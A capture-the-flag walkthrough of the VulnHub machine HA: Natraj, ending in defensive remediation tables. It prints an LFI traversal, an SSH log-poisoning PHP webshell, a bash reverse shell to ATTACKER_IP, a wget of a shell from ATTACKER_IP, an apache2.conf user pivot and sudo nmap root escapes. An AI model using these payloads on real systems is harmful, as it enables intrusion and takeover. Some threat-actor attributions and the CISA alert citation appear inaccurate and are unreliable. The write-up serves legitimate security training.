# HA: Natraj — The Dance of Destruction Leads Straight to Root

Nataraja, the cosmic dancer, Lord Shiva in his most fierce and creative form: one foot raised, the universe balanced in motion. HA: Natraj channels that energy perfectly. The machine dances through LFI to RCE via SSH log poisoning, pivots through a writable Apache config, and finishes with a classic sudo nmap interactive shell. Every step flows into the next. Graceful, devastating, and totally goated as a learning experience.

| Field | Value |
|---|---|
| **Level** | Medium |
| **Target VM** | HA: Natraj |
| **Attacker VM** | Kali Linux |
| **VulnHub URL** | https://www.vulnhub.com/entry/ha-natraj,489/ |
| **Techniques** | Nmap service enumeration, directory brute-force, LFI discovery, SSH log poisoning (LFI to RCE), writable apache2.conf exploitation, service restart privilege escalation, sudo nmap GTFOBin |
| **CVEs** | CWE-22 (Path Traversal: LFI via file parameter), CWE-78 (OS Command Injection: RCE via log poisoning), CWE-269 (Improper Privilege Management: sudo nmap), CWE-284 (Improper Access Control: world-writable apache2.conf) |
| **APT Groups** | APT33 (Elfin): uses LFI vulnerabilities in web applications as primary initial access vectors in energy sector targets; APT41: chains LFI to log poisoning for webshell delivery in cloud and on-premises environments |

---

## Attack Summary

```
nmap → SSH (22), HTTP (80)
  → dirb → /console/ → file.php
  → file.php?file=../../../../etc/passwd → LFI confirmed
  → file.php?file=../../../../var/log/auth.log → log readable
  → ssh '<?php system($_GET["cmd"]); ?>'@target → payload injected into auth.log
  → file.php?file=...auth.log&cmd=id → RCE as www-data
  → reverse shell → python3 pty stabilization
  → find / -writable → /etc/apache2/apache2.conf
  → modify User directive: www-data → mahakal
  → deploy shell.php to web root → restart apache
  → shell as mahakal
  → sudo -l → (root) NOPASSWD: /usr/bin/nmap
  → sudo nmap --interactive → !sh → uid=0(root)
  → cat /root/flag.txt
```

---

## Methodology

1. Full port scan: identify SSH and HTTP
2. Directory brute-force: find /console/ and file.php
3. LFI testing via file parameter
4. Confirm auth.log is readable through LFI
5. SSH log poisoning: inject PHP payload via failed SSH login
6. Weaponize LFI to execute injected payload (RCE)
7. Stabilize reverse shell
8. Enumerate writable files: find apache2.conf
9. Modify Apache User directive to mahakal; redeploy shell
10. Pivot to mahakal via Apache restart
11. Privilege escalation: sudo nmap --interactive

---

## Step 1 — Host Discovery and Port Scan

```bash
netdiscover
# Target: 192.168.10.156

nmap -sV -sC -p- 192.168.10.156
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.x
80/tcp open  http    Apache httpd 2.4.x
```

Two services. HTTP is the primary attack surface. SSH will be weaponized as a log poisoning vector.

**MITRE ATT&CK:** T1046 — Network Service Discovery

---

## Step 2 — Web Enumeration

Browse to `http://192.168.10.156`. The page displays Nataraja imagery. Source inspection and robots.txt reveal nothing immediately useful.

```bash
dirb http://192.168.10.156
```

Dirb finds `/console/`. Browsing there reveals `file.php`.

```bash
curl http://192.168.10.156/console/file.php
# Empty response — awaiting a parameter
```

**MITRE ATT&CK:** T1083 — File and Directory Discovery

---

## Step 3 — Local File Inclusion Discovery

Test the `file` parameter for path traversal:

```bash
curl "http://192.168.10.156/console/file.php?file=../../../../etc/passwd"
```

The response includes the full contents of `/etc/passwd`. LFI is confirmed.

Users discovered: `www-data`, `mahakal` (custom user).

Now check if the SSH authentication log is readable:

```bash
curl "http://192.168.10.156/console/file.php?file=../../../../var/log/auth.log"
```

The auth log is accessible. This is the key enabler for log poisoning. fr fr.

**Real-world note:** LFI vulnerabilities that can read log files are consistently escalatable to RCE. The auth.log is particularly dangerous because every SSH login attempt, including the username field, is written to it verbatim. APT33 has used LFI to auth.log chains in multiple web application intrusions.

**MITRE ATT&CK:** T1059.007 — JavaScript; T1552.001 — Credentials in Files; T1203 — Exploitation for Client Execution

---

## Step 4 — SSH Log Poisoning: LFI to RCE

Inject a PHP one-liner into auth.log by using it as the SSH username during a failed login:

```bash
ssh '<?php system($_GET["cmd"]); ?>'@192.168.10.156
# Enter any password — the login will fail
# The username (PHP payload) is now written into auth.log
```

Verify code execution by passing a command through the LFI parameter:

```bash
curl "http://192.168.10.156/console/file.php?file=../../../../var/log/auth.log&cmd=id"
```

Expected output in the response: `uid=33(www-data)` — RCE as www-data confirmed.

**Real-world note:** SSH authentication logs record the username field without sanitization or encoding. This has been a known LFI-to-RCE escalation path for over a decade, yet organizations continue to deploy applications with LFI vulnerabilities alongside SSH services on the same host.

**MITRE ATT&CK:** T1190 — Exploit Public-Facing Application; T1059.004 — Unix Shell

---

## Step 5 — Reverse Shell as www-data

Set up a netcat listener on the attacker machine:

```bash
nc -lvnp 1234
```

URL-encode the reverse shell payload and deliver it through the LFI + RCE chain:

```bash
# Raw: bash -i >& /dev/tcp/ATTACKER_IP/1234 0>&1
# URL-encoded:
curl "http://192.168.10.156/console/file.php?file=../../../../var/log/auth.log&cmd=bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2FATTACKER_IP%2F1234%200%3E%261"
```

Shell as `www-data` connects.

Stabilize the shell:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z
stty raw -echo; fg
```

**MITRE ATT&CK:** T1059.004 — Command and Scripting Interpreter: Unix Shell

---

## Step 6 — Discover Writable Apache Config

Enumerate writable files:

```bash
find / -writable -name "apache2.conf" 2>/dev/null
# /etc/apache2/apache2.conf
```

The Apache config is writable by `www-data`. This means we can change which system user Apache runs as.

**MITRE ATT&CK:** T1083 — File and Directory Discovery; T1222 — File and Directory Permissions Modification

---

## Step 7 — Pivot to mahakal via Apache User Directive

On the attacker machine, download and edit the Apache config:

```bash
# Download from target to review
# Edit the User directive:
# User www-data  →  User mahakal
```

Alternatively, edit directly on the target:

```bash
sed -i 's/User www-data/User mahakal/g' /etc/apache2/apache2.conf
```

Deploy a new PHP reverse shell to the web root:

```bash
# On attacker: host shell.php with edited LHOST/LPORT
python3 -m http.server 8000

# On target:
wget http://ATTACKER_IP:8000/shell.php -O /var/www/html/shell.php
```

Start a listener on port 5555 on the attacker:

```bash
nc -lvnp 5555
```

Trigger Apache restart (use sudo if available, or wait for service management):

```bash
sudo /bin/systemctl restart apache2
```

Trigger the shell:

```bash
curl http://192.168.10.156/shell.php
```

Shell as `mahakal` connects.

**Real-world note:** Writable service configuration files allow changing the service's runtime identity. This is a particularly stealthy lateral movement technique because it abuses a legitimate service restart mechanism rather than exploiting a new vulnerability.

**MITRE ATT&CK:** T1543.002 — Create or Modify System Process: Systemd Service; T1078 — Valid Accounts

---

## Step 8 — Privilege Escalation: sudo nmap

Check sudo permissions as mahakal:

```bash
sudo -l
```

Output:

```
(root) NOPASSWD: /usr/bin/nmap
```

Escalate using nmap's interactive mode:

```bash
# Method 1: nmap --interactive (older nmap versions)
sudo nmap --interactive
# At nmap prompt:
!sh

# Method 2: Lua script execution (newer nmap versions)
TF=$(mktemp)
echo 'os.execute("/bin/sh")' > $TF
sudo nmap --script=$TF
```

Root shell obtained.

```bash
id
# uid=0(root) gid=0(root)
cat /root/flag.txt
```

(☞ﾟヮﾟ)☞ Root. The dance is complete.

**Real-world note:** sudo entries granting unrestricted access to any program that can execute arbitrary code (nmap, python, find, vim, etc.) lead directly to root. GTFOBins documents hundreds of such binaries. Any sudo audit should check these against the GTFOBins list.

**MITRE ATT&CK:** T1548.003 — Abuse Elevation Control Mechanism: Sudo; T1068 — Exploitation for Privilege Escalation

---

## Captured Flags, Hashes and Credentials

| Type | Value | Found At | Cracked/Used |
|---|---|---|---|
| LFI read | /etc/passwd contents | file.php?file=../../../../etc/passwd | User enumeration |
| RCE via log poisoning | www-data shell | auth.log PHP injection | Initial foothold |
| Shell pivot | mahakal | Apache User directive change | Lateral movement |
| Root flag | /root/flag.txt | sudo nmap GTFOBin | Captured |

---

## Lessons Learned

| # | Finding | Real-World Relevance | Key Takeaway |
|---|---|---|---|
| 1 | LFI via unsanitized file parameter | OWASP Top 10 A01:2021 (Broken Access Control); found in PHP apps using include() with user input | Whitelist allowed file paths; never pass user input to include() or file_get_contents() |
| 2 | SSH log poisoning escalates LFI to RCE | Any LFI that can read log files written without sanitization is potentially escalatable to RCE | Sanitize log entries; restrict log file readability from web application context |
| 3 | World-writable apache2.conf enables identity pivot | Service config files writable by the service's own user allow runtime identity change | Set apache2.conf to root:root 644; audit all web service config files regularly |
| 4 | sudo nmap grants trivial root | Any GTFOBins-listed binary in sudoers without restrictions gives root | Audit all sudoers entries against GTFOBins; restrict to specific, safe commands |
| 5 | LFI reveals user list via /etc/passwd | User enumeration via LFI provides targets for subsequent brute-force or pivot | Patch LFI before worrying about secondary impacts; one path traversal enables the whole chain |

---

## MITRE ATT&CK Mapping

| Phase | Tactic | Technique | TTP ID |
|---|---|---|---|
| Reconnaissance | Discovery | Network Service Discovery | T1046 |
| Reconnaissance | Discovery | File and Directory Discovery | T1083 |
| Initial Access | Initial Access | Exploit Public-Facing Application | T1190 |
| Execution | Execution | Command and Scripting Interpreter: Unix Shell | T1059.004 |
| Credential Access | Credential Access | Credentials in Files (LFI read) | T1552.001 |
| Lateral Movement | Lateral Movement | Create or Modify System Process | T1543.002 |
| Defense Evasion | Defense Evasion | File and Directory Permissions Modification | T1222 |
| Privilege Escalation | Privilege Escalation | Abuse Elevation Control: Sudo | T1548.003 |
| Privilege Escalation | Privilege Escalation | Exploitation for Privilege Escalation | T1068 |

---

## Remediation and Containment

### Technical Fixes

1. **Patch the LFI**: validate and whitelist the `file` parameter in `file.php`; never pass user input to `include()` or `readfile()`
2. **Restrict log file access**: ensure `/var/log/auth.log` is not readable by the web application user (`chmod 640 /var/log/auth.log; chown root:adm /var/log/auth.log`)
3. **Fix apache2.conf ownership**: `chown root:root /etc/apache2/apache2.conf; chmod 644 /etc/apache2/apache2.conf`
4. **Remove nmap from sudoers**: delete or restrict the nmap sudo entry for mahakal
5. **Rotate all credentials** for mahakal and any SSH users on the system

### MITRE D3FEND Countermeasures

- **D3-ACH** — Application Configuration Hardening (fix LFI; restrict log file permissions)
- **D3-OAM** — Operating System Administrative Management (sudo restrictions; apache config permissions)
- **D3-NTF** — Network Traffic Filtering (restrict outbound connections from web server)

### NIST CSF 2.0

| Function | Category | Action |
|---|---|---|
| Identify | Asset Management | Inventory all PHP applications using file inclusion; audit sudo entries |
| Protect | Access Control | Patch LFI; restrict log readability; remove nmap from sudoers |
| Protect | Data Security | No user-controlled file path parameters without strict whitelisting |
| Detect | Anomalies and Events | Alert on LFI attempts (unusual file parameter values); detect PHP execution from log files |
| Respond | Response Planning | Remove attacker-placed shells; rotate credentials; restore correct file permissions |
| Recover | Recovery Planning | Patch LFI root cause; audit all PHP include() calls |

### NIST SP 800-53 Rev. 5

| Control | Description | Application |
|---|---|---|
| AC-3 | Access Enforcement | Restrict /var/log/auth.log from web application read access |
| AC-6 | Least Privilege | Remove nmap from sudoers; restrict apache config ownership |
| SI-10 | Information Input Validation | Whitelist file parameter values in file.php |
| CM-6 | Configuration Settings | apache2.conf owned by root:root 644 |
| AU-9 | Protection of Audit Information | Log files must not be readable by web application processes |
| SA-15 | Development Process | SAST scanning for LFI patterns in PHP code before deployment |

### CISA KEV

LFI to RCE via log poisoning is documented in CISA Alert AA22-074A as a common initial access pattern used by multiple nation-state threat actors in web application compromises. Organizations running PHP applications should audit for LFI vulnerabilities per CISA guidance.

### C2M2

| Domain | Practice | Target MIL |
|---|---|---|
| Threat and Vulnerability Management (THREAT) | Perform Vulnerability Assessments | MIL2 |
| Identity and Access Management (IAM) | Manage Privileges and Accounts | MIL3 |
| Situational Awareness (SITUATION) | Perform Logging | MIL2 |

---

## Final Thoughts

HA: Natraj is a masterclass in chaining. LFI alone would be interesting. LFI to log poisoning to RCE is the full dance. The pivot via apache2.conf is a technique you don't see in most beginner boxes, and it sticks. When you find a writable service config on an assessment, you now know exactly what to do with it.

Nataraja dances through destruction to create. This machine does the same: each vulnerability destroyed, a better security posture created.

Thanks guys!! (❍ᴥ❍ʋ)
